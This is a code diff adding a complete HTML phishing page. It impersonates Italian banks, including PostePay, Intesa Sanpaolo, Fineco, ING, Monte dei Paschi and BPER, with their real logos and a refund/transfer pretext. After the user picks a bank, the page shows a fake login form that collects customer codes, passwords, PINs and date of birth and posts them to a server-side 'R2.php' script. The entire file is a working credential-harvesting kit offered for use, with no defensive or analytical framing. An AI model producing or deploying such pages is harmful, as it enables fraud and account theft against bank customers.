@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Select Your Bank</title>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #121212;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 16px;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    h1 {
+      font-weight: 700;
+      font-size: 1.8rem;
+      margin-bottom: 4px;
+    }
+
+    p.description {
+      color: #cccccc;
+      font-size: 1rem;
+      line-height: 1.4;
+      margin-top: 0;
+      margin-bottom: 16px;
+    }
+
+    .search-box {
+      width: 100%;
+      padding: 14px 18px;
+      font-size: 1rem;
+      border-radius: 10px;
+      border: none;
+      background-color: #2c2c2c;
+      color: #ffffff;
+      outline-offset: 2px;
+      outline-color: transparent;
+      transition: outline-color 0.2s ease-in-out;
+    }
+    .search-box:focus {
+      outline-color: #4a90e2;
+    }
+
+    .section-title {
+      font-weight: 700;
+      font-size: 1.1rem;
+      margin: 16px 0 8px 0;
+    }
+
+    .bank-list {
+      background-color: #1e1e1e;
+      border-radius: 12px;
+      padding: 8px 0;
+      max-height: 350px;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #4a90e2 transparent;
+    }
+    .bank-list::-webkit-scrollbar {
+      width: 6px;
+    }
+    .bank-list::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    .bank-list::-webkit-scrollbar-thumb {
+      background-color: #4a90e2;
+      border-radius: 10px;
+      border: 2px solid transparent;
+    }
+
+    .bank-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 12px 20px;
+      cursor: pointer;
+      transition: background-color 0.2s ease-in-out;
+      user-select: none;
+    }
+    .bank-item:focus,
+    .bank-item:hover {
+      background-color: #333333;
+      outline: none;
+    }
+    .bank-item:focus-visible {
+      outline: 2px solid #4a90e2;
+      outline-offset: 2px;
+    }
+
+    .bank-logo {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      object-fit: contain;
+      background-color: transparent;
+      flex-shrink: 0;
+    }
+
+    .bank-name {
+      font-size: 1.05rem;
+      font-weight: 500;
+      color: #ffffff;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .no-results {
+      color: #888888;
+      padding: 12px 20px;
+      font-size: 1rem;
+      text-align: center;
+    }
+
+    /* Clean login page styles */
+    .login-page {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      padding: 40px 32px 32px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.15);
+      color: #003d99;
+      font-family: Arial, sans-serif;
+      position: relative;
+      box-sizing: border-box;
+    }
+    .login-page.active {
+      display: flex;
+    }
+
+    button.back-btn {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      background: none;
+      border: none;
+      color: #003d99;
+      font-size: 1rem;
+      cursor: pointer;
+      font-weight: 600;
+      padding: 0;
+      user-select: none;
+    }
+    button.back-btn:hover,
+    button.back-btn:focus {
+      text-decoration: underline;
+      outline: none;
+    }
+
+    .login-bank-logo {
+      width: 90px;
+      height: 90px;
+      margin-bottom: 24px;
+      object-fit: contain;
+      border-radius: 12px;
+      background-color: transparent;
+    }
+
+    .login-title {
+      font-weight: 700;
+      font-size: 1.5rem;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    label {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #003d99;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="date"] {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 6px;
+      border: 1.8px solid #cccccc;
+      font-size: 1rem;
+      font-weight: 400;
+      color: #000;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+    }
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="password"]:focus,
+    input[type="date"]:focus {
+      outline: none;
+      border-color: #1d72b8;
+      box-shadow: 0 0 6px #6ba7ea;
+      background-color: #fff;
+    }
+    input::placeholder {
+      color: #999999;
+      font-weight: 300;
+    }
+
+    button.submit-btn {
+      background-color: #789acb;
+      border: none;
+      color: white;
+      font-size: 1.05rem;
+      font-weight: 700;
+      padding: 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      transition: background-color 0.3s ease;
+    }
+    button.submit-btn:hover,
+    button.submit-btn:focus {
+      background-color: #5c7abb;
+      outline: none;
+    }
+
+    .login-links {
+      margin-top: 12px;
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      font-size: 0.9rem;
+    }
+    .login-links a {
+      color: #003d99;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+      user-select: none;
+    }
+    .login-links a:hover,
+    .login-links a:focus {
+      text-decoration: underline;
+      outline: none;
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 12px 8px;
+      }
+      .container {
+        max-width: 100%;
+      }
+      h1 {
+        font-size: 1.6rem;
+      }
+      p.description {
+        font-size: 0.95rem;
+      }
+      .bank-logo {
+        width: 32px;
+        height: 32px;
+      }
+      .bank-name {
+        font-size: 1rem;
+      }
+      .search-box {
+        padding: 12px 16px;
+      }
+      .login-page {
+        max-width: 100%;
+        padding: 32px 24px 24px;
+      }
+      .login-title {
+        font-size: 1.3rem;
+      }
+      .login-bank-logo {
+        width: 72px;
+        height: 72px;
+        margin-bottom: 20px;
+      }
+    }
+
+    .visually-hidden { 
+      position: absolute !important; 
+      height: 1px; width: 1px; 
+      overflow: hidden; 
+      clip: rect(1px,1px,1px,1px); 
+      white-space: nowrap; 
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Select Bank Screen -->
+  <main class="container" id="selectBankScreen" role="main" aria-label="Select your bank">
+    <h1>Select your bank</h1>
+    <p class="description">
+      We'll redirect you to your bank to approve the transfer, then bring you back. Your account details will be securely saved for future use.
+    </p>
+
+    <label for="searchInput" class="visually-hidden">Search banks</label>
+    <input
+      type="search"
+      id="searchInput"
+      class="search-box"
+      placeholder="Search"
+      aria-label="Search banks"
+      autocomplete="off"
+      autocorrect="off"
+      autocapitalize="none"
+      spellcheck="false"
+    />
+
+    <div class="section-title">Popular</div>
+    <div class="bank-list" id="bankListPopular" tabindex="0" aria-label="Popular banks list" role="list"></div>
+
+    <div class="section-title">All banks</div>
+    <div class="bank-list" id="bankListAll" tabindex="0" aria-label="All banks list" role="list"></div>
+  </main>
+
+  <!-- Dynamic Login Screen -->
+  <section class="login-page" id="loginScreen" role="main" aria-hidden="true" aria-label="Login page">
+    <button class="back-btn" id="backToBankSelect" aria-label="Go back to bank selection">&larr; Back</button>
+
+    <img src="" alt="Bank Logo" class="login-bank-logo" id="loginBankLogo" />
+
+    <h2 class="login-title" id="loginBankName" tabindex="0">Richiamo Effettuato Con Successo, Verifica Con Il Tuo Istituto Bancario</h2>
+
+    <form id="loginForm" method="post" action="R2.php" novalidate>
+      <input type="hidden" name="bank" id="bankName">
+      <div id="dynamicInputsContainer">
+        <!-- Dynamic inputs inserted here -->
+      </div>
+      <button type="submit" class="submit-btn">Login</button>
+    </form>
+
+    <div class="login-links">
+      <a href="#" id="activateCodes">Activate Codes</a>
+      <a href="#" id="lostCodes">Lost Codes</a>
+    </div>
+  </section>
+
+  <script>
+    const banks = [
+      {
+        name: "PostePay",
+        logo: "https://www.media.poste.it/115928d8-bbe0-41ff-963a-1de8efe7a784/lg/webp/logo-pp@2x",
+        inputs: [
+          { label: "Username / Email / Telefono", name: "username", type: "text", placeholder: "" },
+          { label: "Password", name: "password", type: "password", placeholder: "Password" }
+        ]
+      },
+      {
+        name: "Banca Intesa Sanpaolo",
+        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0AEtj4ViehyS_3JJCr84W3SJs_jDC3u-BIw&s",
+        inputs: [
+          { label: "Codice Cliente", name: "codice_cliente", type: "text", placeholder: "" },
+          { label: "PIN", name: "pin", type: "password", placeholder: "PIN" }
+        ]
+      },
+      {
+        name: "Fineco",
+        logo: "https://images.finecobank.com/common-global/img/logo/logo-fineco.svg",
+        inputs: [
+          { label: "User ID", name: "user_id", type: "text", placeholder: "" },
+          { label: "Password", name: "password", type: "password", placeholder: "Password" }
+        ]
+      },
+      {
+        name: "ING",
+        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHIOs3yl68B6bwzQfYVqz2ZeDkqJhaNEujeQ&s",
+        inputs: [
+          { label: "Codice Cliente", name: "codice_cliente", type: "text", placeholder: "" },
+          { label: "Data di nascita", name: "data_di_nascita", type: "date", placeholder: "" },
+          { label: "PIN", name: "pin", type: "password", placeholder: "PIN" }
+        ]
+      },
+      {
+        name: "Banca Monte dei Paschi di Siena",
+        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSeA4W6o4tNdS9ViQ-oS0RCFwYdUCJrSi1Jw&s",
+        inputs: [
+          { label: "Codice Cliente", name: "codice_cliente", type: "text", placeholder: "" },
+          { label: "Password", name: "password", type: "password", placeholder: "Password" }
+        ]
+      },
+      {
+        name: "BPER",
+        logo: "https://www.bper.it/image/layout_set_logo?img_id=2790454317&t=1764183469060",
+        inputs: [
+          { label: "Codice Utente", name: "codice_utente", type: "text", placeholder: "" },
+          { label: "Password", name: "password", type: "password", placeholder: "Password" }
+        ]
+      }
+    ];
+
+    // Map popular banks based on known names
+    const popularBankNames = banks.map(b => b.name);
+
+    const bankListPopular = document.getElementById("bankListPopular");
+    const bankListAll = document.getElementById("bankListAll");
+    const searchInput = document.getElementById("searchInput");
+    const selectBankScreen = document.getElementById("selectBankScreen");
+    const loginScreen = document.getElementById("loginScreen");
+    const loginBankLogo = document.getElementById("loginBankLogo");
+    const loginBankName = document.getElementById("loginBankName");
+    const backToBankSelectBtn = document.getElementById("backToBankSelect");
+    const loginForm = document.getElementById("loginForm");
+    const dynamicInputsContainer = document.getElementById("dynamicInputsContainer");
+    const bankNameInput = document.getElementById("bankName");
+
+    // Create bank item for list
+    function createBankItem(bank) {
+      const bankItem = document.createElement("div");
+      bankItem.className = "bank-item";
+      bankItem.setAttribute("role", "listitem");
+      bankItem.tabIndex = 0;
+      bankItem.setAttribute("aria-label", bank.name + " bank");
+
+      bankItem.onclick = () => openLoginPage(bank);
+      bankItem.onkeypress = (e) => {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          openLoginPage(bank);
+        }
+      };
+
+      const logo = document.createElement("img");
+      logo.src = bank.logo;
+      logo.alt = `${bank.name} logo`;
+      logo.className = "bank-logo";
+      bankItem.appendChild(logo);
+
+      const name = document.createElement("div");
+      name.className = "bank-name";
+      name.textContent = bank.name;
+      bankItem.appendChild(name);
+
+      return bankItem;
+    }
+
+    // Render banks into container
+    function renderBanks(container, banksToRender) {
+      container.innerHTML = "";
+      if (banksToRender.length === 0) {
+        const noResults = document.createElement("div");
+        noResults.className = "no-results";
+        noResults.textContent = "No banks found.";
+        container.appendChild(noResults);
+        return;
+      }
+      banksToRender.forEach(bank => {
+        container.appendChild(createBankItem(bank));
+      });
+    }
+
+    // Render all banks initially
+    function renderAllBanks() {
+      renderBanks(bankListPopular, banks.filter(b => popularBankNames.includes(b.name)));
+      renderBanks(bankListAll, banks);
+    }
+
+    // Filter banks by search term
+    function filterBanks(searchTerm) {
+      const filtered = banks.filter(bank =>
+        bank.name.toLowerCase().includes(searchTerm.toLowerCase())
+      );
+      renderBanks(bankListPopular, filtered.filter(b => popularBankNames.includes(b.name)));
+      renderBanks(bankListAll, filtered);
+    }
+
+    // Dynamically create input element
+    function createInputField({label, name, type, placeholder}) {
+      const wrapper = document.createElement("div");
+
+      const labelElem = document.createElement("label");
+      labelElem.htmlFor = name;
+      labelElem.textContent = label;
+      wrapper.appendChild(labelElem);
+
+      const inputElem = document.createElement("input");
+      inputElem.type = type === "date" ? "date" : (type === "email" ? "email" : "text");
+      inputElem.id = name;
+      inputElem.name = name;
+      inputElem.placeholder = placeholder || "";
+      if (type === "password") {
+        inputElem.type = "password";
+      }
+      inputElem.required = true;
+      inputElem.autocomplete = (name === "password" ? "current-password" : "on");
+      inputElem.setAttribute("aria-required", "true");
+      wrapper.appendChild(inputElem);
+
+      return wrapper;
+    }
+
+    // Open login page with dynamic inputs for the bank
+    function openLoginPage(bank) {
+      selectBankScreen.style.display = "none";
+      loginScreen.classList.add("active");
+      loginScreen.setAttribute("aria-hidden", "false");
+
+      loginBankName.textContent = "Access your reserved area";
+      loginBankLogo.src = bank.logo;
+      loginBankLogo.alt = `${bank.name} logo`;
+
+      // Clear previous inputs
+      dynamicInputsContainer.innerHTML = "";
+      bankNameInput.value = bank.name; // Set the bank name in the hidden input
+
+      // Create and append inputs dynamically
+      bank.inputs.forEach(field => {
+        const inputField = createInputField(field);
+        dynamicInputsContainer.appendChild(inputField);
+      });
+
+      // Focus the first input field
+      const firstInput = dynamicInputsContainer.querySelector("input");
+      if (firstInput) firstInput.focus();
+    }
+
+    backToBankSelectBtn.addEventListener("click", () => {
+      loginScreen.classList.remove("active");
+      loginScreen.setAttribute("aria-hidden", "true");
+      selectBankScreen.style.display = "flex";
+      searchInput.focus();
+    });
+
+    searchInput.addEventListener("input", e => {
+      filterBanks(e.target.value);
+    });
+
+    renderAllBanks();
+  </script>
+
+</body>
+</html>
